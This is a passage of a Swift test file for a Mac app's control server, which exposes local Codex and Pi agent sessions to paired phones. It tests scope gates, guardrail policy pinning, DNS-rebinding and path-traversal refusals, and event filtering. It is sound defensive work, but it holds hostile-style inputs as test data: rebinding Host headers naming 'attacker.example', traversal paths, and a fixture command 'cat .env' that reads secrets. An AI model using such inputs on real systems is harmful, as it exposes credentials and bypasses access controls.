        // cannot offer to start it — and says nothing about a folder nobody chose.
        let sessions = await model.agentSessions()
        #expect(sessions.sessions.map(\.engine) == ControlAPI.agentEngines)
        #expect(sessions.sessions.allSatisfy { $0.state == "stopped" })
        let codex = try #require(sessions.sessions.first { $0.engine == "codex" })
        #expect(codex.cwd == nil)
        // Pi's workspace is the app's own, and is shown relative to the home folder: the
        // account's name is nothing a phone needs.
        let pi = try #require(sessions.sessions.first { $0.engine == "pi" })
        #expect(pi.cwd?.hasPrefix("~/") == true)
        #expect(pi.cwd?.contains(NSUserName()) == false)
    }

    /// Whether anything stands between the agent and the Mac, in the words a phone can act
    /// on, for every combination that changes the answer.
    @Test func theSummarySaysWhetherAnythingAsksBeforeTheAgentActs() async throws {
        let model = Self.freshModel()
        func summary(
            _ engine: String, _ guardrail: GuardrailPosture
        ) async throws -> ControlAPI.AgentSessionSummary {
            try await AgentSessionSeams.$guardrails.withValue(guardrail) {
                try #require(await model.agentSessions().sessions.first { $0.engine == engine })
            }
        }
        // Pi never asks on its own; the gate is the guardrail's — and a gate that cannot
        // judge hands every call to a person, which is asking, not screening.
        #expect(try await summary("pi", .screening).approvals == "screened")
        #expect(try await summary("pi", .unavailable).approvals == "asked")
        #expect(try await summary("pi", .off).approvals == "unattended")
        #expect(try await summary("pi", .off).sandbox == "none")

        // Codex asks under its default policy; the guardrail decides whether Jev looks first
        // and pins full access down to the working folder.
        model.settings.codexSandbox = "danger-full-access"
        #expect(try await summary("codex", .off).approvals == "asked")
        #expect(try await summary("codex", .off).sandbox == "danger-full-access")
        #expect(try await summary("codex", .screening).approvals == "screened")
        #expect(try await summary("codex", .screening).sandbox == "workspace-write")
        // Switched on without a key or a budget: still pinned, but nothing judges.
        #expect(try await summary("codex", .unavailable).approvals == "asked")
        #expect(try await summary("codex", .unavailable).sandbox == "workspace-write")
        // "Never ask" means nobody is asked — unless the guardrail pins it back.
        model.settings.codexApprovalPolicy = "never"
        #expect(try await summary("codex", .off).approvals == "unattended")
        #expect(try await summary("codex", .screening).approvals == "screened")
        #expect(try await summary("codex", .unavailable).approvals == "asked")

        // A running thread keeps what it started with, whatever the settings say now.
        model.codexThreadID = "th_never"
        BuddyAgentSessions.shared.noteThreadPolicy(
            owner: model.agentLedgerOwner, engine: "codex", threadID: "th_never",
            approval: "never", sandbox: "read-only"
        )
        #expect(try await summary("codex", .screening).approvals == "unattended")
        #expect(try await summary("codex", .screening).sandbox == "read-only")
    }

    /// The rule a new Codex thread starts under, moved into one function so the thread and
    /// what a phone is told about it cannot disagree — pinned here, because it is the rule
    /// that keeps the guardrail in the loop.
    @Test func aNewCodexThreadStartsUnderTheRuleTheGuardrailNeeds() {
        func policy(_ approval: String?, _ sandbox: String?, guarded: Bool) -> [String] {
            let rule = AppModel.codexThreadPolicy(
                storedApproval: approval, storedSandbox: sandbox, guarded: guarded
            )
            return [rule.approval, rule.sandbox]
        }
        // Nothing stored: ask before commands, read-only.
        #expect(policy(nil, nil, guarded: false) == ["on-request", "read-only"])
        // The owner's own choices stand while the guardrail is off…
        #expect(policy("never", "danger-full-access", guarded: false)
            == ["never", "danger-full-access"])
        #expect(policy("untrusted", "workspace-write", guarded: false)
            == ["untrusted", "workspace-write"])
        // …and while it is on, the two that would stop Codex asking are pinned back.
        #expect(policy("never", "danger-full-access", guarded: true)
            == ["on-request", "workspace-write"])
        #expect(policy("untrusted", "read-only", guarded: true) == ["on-request", "read-only"])
        // Values an older build may have stored fall back rather than failing thread/start.
        #expect(policy("sometimes", "everything", guarded: false) == ["on-request", "read-only"])
    }

    /// Pi's start from each state. From `failed` it is what the Mac's Retry does — never a
    /// 200 that does nothing — and from `stopping` it is a refusal to wait.
    @Test func startingPiFromEachStateDoesWhatTheMacWould() async throws {
        #expect(AppModel.piStart(from: .idle) == .start)
        #expect(AppModel.piStart(from: .failed("npx exited")) == .restart)
        #expect(AppModel.piStart(from: .starting("Downloading…")) == .nothing)
        #expect(AppModel.piStart(from: .ready) == .nothing)
        #expect(AppModel.piStart(from: .stopping) == .refuse)

        let model = Self.freshModel()
        model.piState = .stopping
        await #expect(throws: AgentSessionError.stillStopping("pi")) {
            try await model.startAgentSession(engine: "pi")
        }
    }

    /// A new thread from the phone is the Mac's own New Thread: the transcript it clears is
    /// the one on screen, and the session it hands back is the one both sides now have.
    @Test func aNewThreadFromThePhoneIsTheMacsOwnNewThread() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexRuntime = CodexRuntime()   // never started: the interrupt goes nowhere
        model.codexThreadID = "th_01HZY"
        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("Earlier."))]
        model.codexApprovals = [CodexApproval(rpcID: .number(1), kind: .command("ls"))]
        model.codexTurnActive = true
        let before = try await model.agentSession(engine: "codex", query: .init())

        let fresh = try await model.newAgentThread(engine: "codex")
        #expect(fresh.itemCount == 0)
        #expect(fresh.threadID == nil)
        #expect(fresh.turnActive == false)
        #expect(fresh.pendingApprovals == 0)
        #expect(fresh.epoch != before.epoch)
        // The Mac's own window, not a copy of it.
        #expect(model.codexItems.isEmpty)

        // Pi's is a real RPC command rather than a restart, so it needs a Pi to send it to.
        model.piState = .ready
        await #expect(throws: AgentSessionError.notRunning("pi")) {
            try await model.newAgentThread(engine: "pi")
        }
    }

    // MARK: - The routes, over a real socket

    /// Every new route reaches the host it is supposed to, with the parameters out of its
    /// path and query — and `POST .../messages` answers 202 rather than 200, with a reason
    /// phrase that says so.
    @Test func everyRouteReachesTheHostWithItsParameters() async throws {
        try await withAgentServer { fixture in
            let phone = try await fixture.pair()
            await AgentCallLog.shared.clear()

            #expect(try await fixture.phone.status(
                "GET", "/agent/sessions", token: phone.token
            ) == 200)
            #expect(try await fixture.phone.status(
                "GET", "/agent/sessions/codex?since=12&epoch=E1&limit=50", token: phone.token
            ) == 200)
            #expect(try await fixture.phone.status(
                "POST", "/agent/sessions/codex/start", token: phone.token, body: "{}"
            ) == 200)
            #expect(try await fixture.phone.status(
                "POST", "/agent/sessions/pi/new", token: phone.token, body: "{}"
            ) == 200)
            #expect(try await fixture.phone.status(
                "POST", "/agent/sessions/codex/interrupt", token: phone.token, body: "{}"
            ) == 200)
            #expect(try await fixture.phone.status(
                "DELETE", "/agent/sessions/pi", token: phone.token
            ) == 200)

            let (sent, body) = try await fixture.phone.call(
                "POST", "/agent/sessions/codex/messages", token: phone.token,
                body: #"{"text":"Fix the failing test.","model":"local/qwen3"}"#
            )
            #expect(sent == 202)
            #expect(try JSONDecoder().decode(
                ControlAPI.AgentMessageAccepted.self, from: body
            ).itemID == AgentCallLog.acceptedItemID)

            #expect(try await fixture.phone.status(
                "POST", "/agent/sessions/codex/approvals/appr-1", token: phone.token,
                body: #"{"decision":"decline"}"#
            ) == 200)

            #expect(await AgentCallLog.shared.calls == [
                "sessions",
                "session codex since=12 epoch=E1 limit=50",
                "start codex",
                "new pi",
                "interrupt codex",
                "stop pi",
                "send codex text=Fix the failing test. model=local/qwen3",
                "answer codex appr-1 decline",
            ])

            // Transcripts go out without the indentation, which is a fifth of their bytes.
            let (_, listed) = try await fixture.phone.call(
                "GET", "/agent/sessions", token: phone.token
            )
            #expect(!String(decoding: listed, as: UTF8.self).contains("\n"))

            // An engine this Mac does not run is a 404 with a sentence, not a route that
            // quietly matched nothing — and a cursor that is not a number is a 400 rather
            // than the whole transcript every time, which would hide the client's bug.
            let (missing, refusal) = try await fixture.phone.call(
                "GET", "/agent/sessions/claude", token: phone.token
            )
            #expect(missing == 404)
            #expect(String(decoding: refusal, as: UTF8.self).contains("codex and pi"))
            #expect(try await fixture.phone.status(
                "GET", "/agent/sessions/codex?since=item_msg_1&epoch=E1", token: phone.token
            ) == 400)
            #expect(try await fixture.phone.status(
                "GET", "/agent/sessions/codex?limit=lots", token: phone.token
            ) == 400)

            // 202 says its own name on the status line.
            let payload = #"{"text":"hi"}"#
            let accepted = try await rawHTTP(
                port: fixture.local.port, session: fixture.local.session,
                "POST /agent/sessions/codex/messages HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                + "Authorization: Bearer \(fixture.local.token)\r\n"
                + "Content-Type: application/json\r\nContent-Length: \(payload.utf8.count)\r\n\r\n"
                + payload
            )
            #expect(accepted.hasPrefix("HTTP/1.1 202 Accepted"))
        }
    }

    /// The gate, on every one of them: full control only, never a chat-only phone, never a
    /// peer, never an unauthenticated caller, and never this Mac's own token from out on
    /// the tailnet.
    @Test func theAgentRoutesAreFullScopeAndNeverThePeers() async throws {
        try await withAgentServer(swarmToken: Self.swarmSecret) { fixture in
            let full = try await fixture.pair(name: "Studio phone")
            let chat = try await fixture.pair(name: "Lent out", scope: .chat)

            for (method, path, body) in Self.everyAgentRoute {
                // A phone paired for chat is refused by the scope gate before the path is
                // ever looked at — the same 403 it gets for POST /load.
                let refusedForChat = try await fixture.phone.call(
                    method, path, token: chat.token, body: body
                )
                #expect(refusedForChat.0 == 403, "\(method) \(path)")
                #expect(
                    String(decoding: refusedForChat.1, as: UTF8.self)
                        .contains("paired for chat only"),
                    "\(method) \(path)"
                )

                // The swarm secret is a credential everywhere else on this server. A node
                // is a machine with a token in a config file, and these routes run
                // commands here.
                let refusedForPeers = try await fixture.local.call(
                    method, path, token: Self.swarmSecret, body: body
                )
                #expect(refusedForPeers.0 == 403, "\(method) \(path)")
                #expect(
                    String(decoding: refusedForPeers.1, as: UTF8.self)
                        .contains("swarm node"),
                    "\(method) \(path)"
                )

                // No token at all, a token that is not one, and this Mac's own token on
                // the tailnet listener — where it is not a credential at all.
                #expect(try await fixture.phone.status(
                    method, path, token: nil, body: body
                ) == 401, "\(method) \(path)")
                #expect(try await fixture.phone.status(
                    method, path, token: "guessed", body: body
                ) == 401, "\(method) \(path)")
                #expect(try await fixture.phone.status(
                    method, path, token: fixture.phone.token, body: body
                ) == 401, "\(method) \(path)")

                // And the two credentials that do pass: a full-control phone out on the
                // tailnet, and this Mac's own token on its own listener.
                #expect(try await fixture.phone.status(
                    method, path, token: full.token, body: body
                ) != 403, "\(method) \(path)")
                #expect(try await fixture.local.status(
                    method, path, token: fixture.local.token, body: body
                ) != 403, "\(method) \(path)")
            }
        }
    }

    /// The loopback listener's second lock: a page that rebinds its own name to 127.0.0.1
    /// still sends its own name as the `Host`.
    @Test func aRebindingHostIsRefusedOnTheLoopbackListener() async throws {
        try await withAgentServer { fixture in
            for host in ["attacker.example", "attacker.example:80", "127.0.0.1.attacker.example"] {
                let answer = try await rawHTTP(
                    port: fixture.local.port, session: fixture.local.session,
                    "GET /agent/sessions HTTP/1.1\r\nHost: \(host)\r\n"
                    + "Authorization: Bearer \(fixture.local.token)\r\n\r\n"
                )
                #expect(answer.hasPrefix("HTTP/1.1 403"), "\(host)")
                #expect(answer.contains(ControlServer.agentsAreForLoopbackHosts), "\(host)")
            }
            // Loopback names pass.
            for host in ["127.0.0.1", "localhost:8080", "[::1]"] {
                let answer = try await rawHTTP(
                    port: fixture.local.port, session: fixture.local.session,
                    "GET /agent/sessions HTTP/1.1\r\nHost: \(host)\r\n"
                    + "Authorization: Bearer \(fixture.local.token)\r\n\r\n"
                )
                #expect(answer.hasPrefix("HTTP/1.1 200"), "\(host)")
            }
        }
    }

    /// Path oddities reach nothing.
    @Test func pathOdditiesReachNothing() async throws {
        try await withAgentServer { fixture in
            let phone = try await fixture.pair()
            for path in [
                "/agent/sessions/CODEX", "/agent/sessions/codex%2F..", "/agent/sessions/..",
                "/agent/sessions/codex/../pi", "//agent//sessions//harness",
            ] {
                let status = try await fixture.phone.status("GET", path, token: phone.token)
                #expect(status == 404 || status == 400, "\(path) -> \(status)")
            }
        }
    }

    // MARK: - The side channel

    /// The filter itself, with every audience at once — which is what makes it
    /// mutation-proof: were it removed, the chat-only phone and the swarm would receive
    /// the very frames the other two are shown receiving here.
    @Test func agentFramesReachOnlyThisMacAndFullControlDevices() async throws {
        let hub = BuddyEventHub()
        let mac = await hub.subscribe(as: .thisMac)
        let full = await hub.subscribe(as: .device(id: "phone", scope: .full))
        let chat = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
        let peer = await hub.subscribe(as: .peer)
        #expect(await hub.agentAudienceCount == 2)

        let secret = ControlAPI.AgentEvent(
            engine: "codex", kind: "item", seq: 1, epoch: "e",
            item: .init(id: "c1", kind: "command", text: "cat .env",
                        output: "API_KEY=placeholder", at: "2026-09-19T10:00:00Z")
        )
        await hub.post(.agent(secret))
        await hub.post(.heartbeat(.init(at: "2026-09-19T10:00:01Z")))
        for subscription in [mac, full, chat, peer] { await hub.cancel(subscription.id) }

        func names(_ stream: AsyncStream<BuddyEvent.Frame>) async -> [String] {
            var seen: [String] = []
            for await frame in stream { seen.append(frame.name) }
            return seen
        }
        #expect(await names(mac.stream) == ["agent", "heartbeat"])
        #expect(await names(full.stream) == ["agent", "heartbeat"])
        // Everything else still arrives — only the transcript is withheld.
        #expect(await names(chat.stream) == ["heartbeat"])
        #expect(await names(peer.stream) == ["heartbeat"])
    }

    /// A peer may keep its event stream for status and heartbeats, but that stream must
    /// not recover owner queue entries, conversation identifiers, or model download
    /// details after the HTTP owner routes have been scoped away.
    @Test func ownerActivityFramesDoNotReachSwarmPeers() async throws {
        let hub = BuddyEventHub()
        let mac = await hub.subscribe(as: .thisMac)
        let full = await hub.subscribe(as: .device(id: "full", scope: .full))
        let chat = await hub.subscribe(as: .device(id: "chat", scope: .chat))
        let peer = await hub.subscribe(as: .peer)

        await hub.post(.job(.init(
            id: "owner-video", kind: "video", status: "done",
            title: "Owner's private prompt", mediaID: "owner-media-id"
        )))
        await hub.post(.verdict(.init(
            verdict: "annotate", conversationID: "owner-conversation-id",
            messageID: "owner-message-id"
        )))
        await hub.post(.download(.init(
            id: "owner-model", name: "Owner model", fraction: 0.5,
            bytesReceived: 1, bytesExpected: 2, bytesPerSecond: 1,
            error: "owner download error"
        )))
        await hub.post(.heartbeat(.init(at: "2026-09-22T10:00:00Z")))
        for subscriber in [mac, full, chat, peer] { await hub.cancel(subscriber.id) }

        func names(_ stream: AsyncStream<BuddyEvent.Frame>) async -> [String] {
            var result: [String] = []
            for await frame in stream { result.append(frame.name) }
            return result
        }
        #expect(await names(mac.stream) == ["job", "verdict", "download", "heartbeat"])
        #expect(await names(full.stream) == ["job", "verdict", "download", "heartbeat"])
        #expect(await names(chat.stream) == ["job", "verdict", "download", "heartbeat"])
        #expect(await names(peer.stream) == ["heartbeat"])
    }

    /// The actual SSE listener assigns the shared bearer the peer audience. Hidden
    /// frames must not arrive over the wire or turn into a spurious resync notice.
    @Test func ownerActivityFramesStayOffThePeerEventWire() async throws {
        let hub = BuddyEventHub()
        try await withServer(
            host: BuddyTestHost(tokens: ["ok"], pace: .milliseconds(1), failing: false),
            swarmToken: Self.swarmSecret, hub: hub
        ) { fixture in
            let received = Recorder()
            let reader = Task {
                try await fixture.local.events(
                    "GET", "/events", token: Self.swarmSecret, body: nil
                ) { frames in
                    received.set(frames)
                    return frames.contains {
                        $0.name == "heartbeat" && $0.data.contains("peer-visible")
                    }
                }
            }
            defer { reader.cancel() }
            #expect(try await received.waitFor { !$0.isEmpty })

            for index in 0..<(BuddyEventHub.bufferedFrames + 8) {
                await hub.post(.job(.init(
                    id: "owner-job-\(index)", kind: "video", status: "done",
                    title: "private owner title", mediaID: "owner-media-id"
                )))
            }
            await hub.post(.verdict(.init(
                verdict: "annotate", conversationID: "private-conversation-id",
                messageID: "private-message-id"
            )))
            await hub.post(.download(.init(
                id: "owner-model", name: "private model", fraction: 0.5,
                bytesReceived: 1, bytesExpected: 2, bytesPerSecond: 1,
                error: "private download error"
            )))
            await hub.post(.heartbeat(.init(at: "peer-visible")))
            _ = try await reader.value
            #expect(received.frames.allSatisfy {
                $0.name != "job" && $0.name != "verdict"
                    && $0.name != "download" && $0.name != "resync"
            })
        }
    }

    /// A stalled reader's buffer holds real frames, not announcements. Drops are counted
    /// where they happen and handed to the reader; nothing is appended to the stream to say
    /// so, where each announcement would push out one more real frame to make room.
    @Test func aStalledReaderIsNeverFloodedWithResyncs() async throws {
        let hub = BuddyEventHub()
        let slow = await hub.subscribe(as: .device(id: "phone", scope: .full))
        // The buffer fills, then ten more posts — ten of the watcher's ticks.
        for index in 0..<(BuddyEventHub.bufferedFrames + 10) {
            await hub.post(.heartbeat(.init(at: "t\(index)")))
        }
        #expect(await hub.takeDropped(slow.id) == 10)
        // Taken is taken: the next gap starts counting from nothing.
        #expect(await hub.takeDropped(slow.id) == 0)
        await hub.cancel(slow.id)
        var names: [String] = []
        for await frame in slow.stream { names.append(frame.name) }
        #expect(names.count == BuddyEventHub.bufferedFrames)
        #expect(!names.contains("resync"))
    }

    /// R1 from the second review, pinned. The documented recovery — on `resync`, fetch with
    /// the cursor you have — must lose nothing.
    ///
    /// The buffer drops its oldest frames, so the `resync` has to reach the phone *before*
    /// the newer frames that survived, not after them: a phone that reads the survivors
    /// first moves its cursor past the gap and then fetches from beyond it. Here a row
    /// changes exactly once, inside the window that is dropped, and the phone recovers it
    /// using only what it has read. Run through the server's own reader, because that is
    /// where the `resync` is placed.
    @Test func aResyncArrivesAtTheGapSoTheCursorYouHaveCatchesUp() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = [
            CodexChatItem(id: "A", kind: .assistant("a0")),
            CodexChatItem(id: "B", kind: .assistant("b0")),
        ]
        // The phone fetched the transcript when it opened the screen.
        let first = try await model.agentSession(engine: "codex", query: .init())
        let hub = BuddyEventHub()
        func tick() async {
            let frames = Self.settle(model, engine: "codex")
            if !frames.isEmpty { await hub.post(frames, excluding: []) }
        }
        await tick()                                         // the watcher's baseline
        let subscription = await hub.subscribe(as: .device(id: "phone", scope: .full))
        _ = await hub.takeNewAgentSubscribers()
        let link = SlowLink()
        let reading = Task {
            await ControlServer.forward(subscription, from: hub) { await link.deliver($0) }
        }

        // The link is fine for a moment…
        model.codexItems[1].kind = .assistant("b1")
        await tick()
        #expect(try await link.waitFor(count: 1))
        // …then stalls, holding the next frame in flight.
        await link.stall()
        model.codexItems[1].kind = .assistant("b2")
        await tick()
        #expect(try await link.waitFor(count: 2))
        // A changes exactly once, and B streams on until A's frame — the oldest in the
        // buffer — is pushed out.
        model.codexItems[0].kind = .assistant("a1")
        await tick()
        let streamed = 43
        for index in 3..<(3 + streamed) {
            model.codexItems[1].kind = .assistant("b\(index)")
            await tick()
        }
        await link.release()
        // b1, b2, one `resync`, and the buffer's worth of survivors.
        #expect(try await link.waitFor(count: 3 + BuddyEventHub.bufferedFrames))

        // A second, smaller gap: its own `resync`, counting only its own losses.
        await link.stall()
        model.codexItems[1].kind = .assistant("c0")
        await tick()
        #expect(try await link.waitFor(count: 4 + BuddyEventHub.bufferedFrames))
        for index in 1...(BuddyEventHub.bufferedFrames + 3) {
            model.codexItems[1].kind = .assistant("c\(index)")
            await tick()
        }
        await link.release()
        #expect(try await link.waitFor(count: 5 + 2 * BuddyEventHub.bufferedFrames))
        await hub.cancel(subscription.id)
        await reading.value

        // The phone, reading in order and following the contract to the letter.
        var cursor = first.seq
        var epoch = first.epoch
        var shownA = "a0"
        var resyncs: [Int] = []
        var readSinceResync = 0
        for frame in await link.frames {
            switch frame.name {
            case "agent":
                let event = try JSONDecoder().decode(ControlAPI.AgentEvent.self, from: frame.data)
                cursor = max(cursor, event.seq)
                epoch = event.epoch
                if event.item?.id == "A", let text = event.item?.text { shownA = text }
                readSinceResync += 1
            case "resync":
                let resync = try JSONDecoder().decode(ControlAPI.ResyncEvent.self, from: frame.data)
                resyncs.append(resync.dropped)
                // Exactly at the gap: never two in a row, never before anything was read.
                #expect(readSinceResync > 0)
                readSinceResync = 0
                let caught = try await model.agentSession(
                    engine: "codex", query: .init(since: cursor, epoch: epoch)
                )
                #expect(caught.complete == false)
                if let row = caught.items.first(where: { $0.id == "A" }) { shownA = row.text }
            default:
                break
            }
        }
        // One per gap, each counting what was lost since the one before: a1 and b3…b45
        // queued behind the frame in flight, 32 kept; then c1…c35 behind c0, 32 kept.
        #expect(resyncs == [1 + streamed - BuddyEventHub.bufferedFrames, 3])
        #expect(shownA == "a1", "after resync + since=\(cursor), the phone shows A=\(shownA)")
    }

    /// The first review's ordering guarantee, across a route reconciling between readings:
    /// resuming from the first frame of a reading still returns every row after it.
    @Test func resumingFromAFrameAcrossReadingsLosesNothing() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        model.codexItems = [
            CodexChatItem(id: "A", kind: .assistant("a0")),
            CodexChatItem(id: "B", kind: .assistant("b0")),
        ]
        _ = Self.settle(model, engine: "codex")
        model.codexItems[1].kind = .assistant("b1")
        _ = try await model.agentSession(engine: "codex", query: .init())   // a route reconciles
        model.codexItems[0].kind = .assistant("a1")
        let tick = Self.events(Self.settle(model, engine: "codex"))
        #expect(tick.map(\.seq) == tick.map(\.seq).sorted())
        let firstFrame = try #require(tick.first)
        let resumed = try await model.agentSession(
            engine: "codex", query: .init(since: firstFrame.seq, epoch: firstFrame.epoch)
        )
        for id in tick.dropFirst().compactMap({ $0.item?.id }) {
            #expect(resumed.items.contains { $0.id == id }, "row \(id) lost")
        }
    }

    /// A phone that walks out of range stops answering rather than hanging up. The tailnet
    /// listener gives up on such a connection within the minute; loopback's does not need
    /// to, and is left as it was.
    ///
    /// The rule is checked on the parameters rather than by walking out of range, which a
    /// loopback test cannot do: loopback always answers. Every tailnet test in this target
    /// binds its listener with these same parameters, which is what shows they bind.
    @Test func theTailnetListenerLetsGoOfAPeerThatStoppedAnswering() throws {
        let parameters = ControlServer.tailnetParameters(
            address: "127.0.0.1", port: NWEndpoint.Port(rawValue: 8788)!
        )
        let tcp = try #require(
            parameters.defaultProtocolStack.transportProtocol as? NWProtocolTCP.Options
        )
        #expect(tcp.enableKeepalive)
        // Silence, then three unanswered probes; or unanswered data for the drop time.
        let silentPeer = tcp.keepaliveIdle + tcp.keepaliveInterval * tcp.keepaliveCount
        #expect(silentPeer < 60)
        #expect(tcp.connectionDropTime > 0)
        // The worst case is a heartbeat written just as the phone left: up to one interval
        // before it goes out, then the drop time.
        let heartbeat = Int(ControlServer.heartbeatInterval.components.seconds)
        #expect(heartbeat + tcp.connectionDropTime < 60)
        #expect(parameters.allowLocalEndpointReuse)
        #expect(parameters.requiredLocalEndpoint == .hostPort(
            host: "127.0.0.1", port: NWEndpoint.Port(rawValue: 8788)!
        ))
    }

    /// Opening frames go to the phone that just arrived, and to nobody else — and a
    /// running watcher neither repeats what an older subscriber has nor misses what
    /// changes after a newcomer's opening.
    @Test func theWatcherOpensEachNewcomerAndThenSendsOnlyWhatChanged() async throws {
        let model = Self.freshModel()
        Self.run(codex: model)
        let hub = BuddyEventHub()
        let pump = AgentEventPump()
        defer { pump.stop() }
        let first = await hub.subscribe(as: .device(id: "phone", scope: .full))
        pump.start(watching: model, hub: hub, interval: .milliseconds(20))
        let received = AgentFrames()
        let collecting = Task {
            for await frame in first.stream {
                if let event = Self.decodeAgent(frame) { received.append(event) }
            }
        }
        defer { collecting.cancel() }

        // Both engines, state and turn each, before anything else.
        #expect(try await received.waitFor { $0.count >= 4 })
        let opening = Array(received.events.prefix(4))
        #expect(opening.map(\.kind) == ["state", "turn", "state", "turn"])
        #expect(Set(opening.map(\.engine)) == Set(ControlAPI.agentEngines))

        model.codexItems.append(CodexChatItem(id: "a1", kind: .assistant("Hello.")))
        #expect(try await received.waitFor { $0.contains { $0.kind == "item" } })
        let changed = received.events.first { $0.kind == "item" }
        #expect(changed?.item?.id == "a1")
        // Never backwards, for this subscriber, from its opening onwards.
        let codexSeqs = received.events.filter { $0.engine == "codex" }
        #expect(codexSeqs.map(\.seq) == codexSeqs.map(\.seq).sorted())
        await hub.cancel(first.id)
    }

    /// Nothing is sampled for an audience that may not see it.
    @Test func theWatcherDoesNotRunForAChatOnlyOrPeerAudience() async throws {
        let model = Self.freshModel()
        let hub = BuddyEventHub()
        let pump = AgentEventPump()
        defer { pump.stop() }
        let chat = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
        let peer = await hub.subscribe(as: .peer)
        pump.start(watching: model, hub: hub, interval: .milliseconds(10))
        let deadline = ContinuousClock.now + .seconds(2)
        while pump.isRunning, ContinuousClock.now < deadline {
            try await Task.sleep(for: .milliseconds(10))
        }
        #expect(!pump.isRunning)
        await hub.cancel(chat.id)
        await hub.cancel(peer.id)
    }

    // MARK: - The badge

    /// What the Chat tab's badge counts, and what it does not — and that it lets go.
    @Test func onlyAFullControlDeviceLightsTheWatchingBadgeAndItFades() async throws {
        let hub = BuddyEventHub()
        let mac = await hub.subscribe(as: .thisMac)
        let peer = await hub.subscribe(as: .peer)
        #expect(await hub.agentWatcherCount() == 0)

        let chatOnly = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
        // A chat-only phone cannot reach an agent session at all, so telling the owner one
        // is watching *this* would be stronger than the truth.
        #expect(await hub.agentWatcherCount() == 0)

        let phone = await hub.subscribe(as: .device(id: "phone", scope: .full))
        #expect(await hub.agentWatcherCount() == 1)
        #expect(BuddyWatchingBadge.caption(1) == "Silicon Buddy is watching")

        // The same phone polling as well as streaming is still one phone.
        let now = Date()
        await hub.noteAgentActivity(deviceID: "phone", at: now)
        #expect(await hub.agentWatcherCount(now: now) == 1)
        // A tablet that sent a message and put the stream away still counts, for a while.
        await hub.noteAgentActivity(deviceID: "tablet", at: now)
        #expect(await hub.agentWatcherCount(now: now) == 2)
        #expect(BuddyWatchingBadge.caption(2).contains("2 Silicon Buddies"))
        #expect(await hub.agentWatcherCount(within: .seconds(180), now: now.addingTimeInterval(179)) == 2)
        // …and then it does not.
        await hub.cancel(phone.id)
        #expect(await hub.agentWatcherCount(within: .seconds(180), now: now.addingTimeInterval(181)) == 0)

        await hub.cancel(chatOnly.id)
        await hub.cancel(peer.id)
        await hub.cancel(mac.id)
    }

    // MARK: - Fixtures

    /// A placeholder, never a real one: this string ends up in nothing but a refusal.
    static let swarmSecret = "swarm-secret-for-the-fixture"

    /// A screening that did not happen, with the guardrail's own sentence — the one every
    /// test here can inject without asking Jev anything.
    static let unscreened = GuardrailScreening.unavailable(
        reason: "Guardrails are off in Settings → TypeSafe (Jev)."
    )

    static let twoModels = [
        GatewayAPI.Model(id: "local/qwen3-coder-30b", displayName: "Qwen3-Coder 30B",
                         where_: "This Mac", serving: true),
        GatewayAPI.Model(id: "node/studio/qwen3.8-27b", displayName: "Qwen3.8 27B",
                         where_: "studio"),
    ]

    /// An `AppModel` with a ledger of its own. The address it lives at may be one an
    /// earlier test's used, so what was remembered about that one is forgotten first.
    static func freshModel() -> AppModel {
        // Not `AppModel(settings:)`: that opens the owner's own video queue, which the
        // `/events` watcher reads and publishes into the owner's media table.
        let model = BuddyTestStore.model()
        BuddyAgentSessions.shared.forget(model)
        return model
    }

    static func run(codex model: AppModel) {
        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
    }

    /// A Pi card the guardrail has spoken about and left to a person.
    static func screenedPiCard(_ arguments: String) -> AppModel.PiItem {
        let card = AppModel.PiItem(
            kind: .approval(requestID: "ui-\(UUID().uuidString.prefix(4))", tool: "bash"),
            text: arguments, running: false, screening: unscreened
        )
        return card
    }

    static let codexTurn: [(String, String)] = [
        ("thread/started", #"{"thread":{"id":"th_01HZY"}}"#),
        ("turn/started", #"{}"#),
        ("item/started", #"{"item":{"id":"item_msg_1","type":"agentMessage","text":""}}"#),
        ("item/agentMessage/delta", #"{"itemId":"item_msg_1","delta":"Running "}"#),
        ("item/agentMessage/delta", #"{"itemId":"item_msg_1","delta":"the suite."}"#),
        ("item/started", #"{"item":{"id":"item_reason_1","type":"reasoning","summary":""}}"#),
        (
            "item/reasoning/summaryTextDelta",
            #"{"itemId":"item_reason_1","delta":"Check the tests first."}"#
        ),
        (
            "item/started",
            #"""
            {"item":{"id":"item_cmd_1","type":"commandExecution",
            "command":"swift test --filter Lisbon","aggregatedOutput":""}}
            """#
        ),
        (
            "item/commandExecution/outputDelta",
            #"{"itemId":"item_cmd_1","delta":"1 test failed: itineraryFitsInThreeDays\n"}"#
        ),
        (
            "item/completed",
            #"""
            {"item":{"id":"item_cmd_1","type":"commandExecution",
            "command":"swift test --filter Lisbon",
            "aggregatedOutput":"1 test failed: itineraryFitsInThreeDays\n"}}
            """#
        ),
        (
            "item/completed",
            #"""
            {"item":{"id":"item_patch_1","type":"fileChange",
            "changes":[{"path":"Sources/Lisbon/Itinerary.swift"}]}}
            """#
        ),
        (
            "item/completed",
            #"""
            {"item":{"id":"item_tool_1","type":"mcpToolCall",
            "server":"silicon-optimizer","tool":"generate_image"}}
            """#
        ),
        (
            "item/completed",
            #"{"item":{"id":"item_web_1","type":"webSearch","query":"lisbon tram 28"}}"#
        ),
        (
            "item/completed",
            #"""
            {"item":{"id":"item_err_1","type":"error",
            "message":"The model stopped mid-turn."}}
            """#
        ),
        ("turn/completed", #"{"turn":{}}"#),
    ]

    /// The same turn as Pi's RPC reports it. Nothing here looks like the list above, which
    /// is the reason both are normalised at all.
    static let piTurn: [String] = [
        #"{"type":"agent_start"}"#,
        #"{"type":"message_start","message":{"role":"assistant"}}"#,
        #"""
        {"type":"message_update","assistantMessageEvent":
        {"type":"thinking_delta","delta":"Check the tests first."}}
        """#,
        #"""
        {"type":"message_update","assistantMessageEvent":
        {"type":"text_delta","delta":"Running "}}
        """#,
        #"""
        {"type":"message_update","assistantMessageEvent":
        {"type":"text_delta","delta":"the suite."}}
        """#,
        #"""
        {"type":"message_update","assistantMessageEvent":{"type":"toolcall_end",
        "toolCall":{"id":"call_1","name":"bash",
        "arguments":{"command":"swift test --filter Lisbon"}}}}
        """#,
        #"""
        {"type":"tool_execution_end","toolName":"bash","result":{"content":
        [{"type":"text","text":"1 test failed: itineraryFitsInThreeDays"}]}}
        """#,
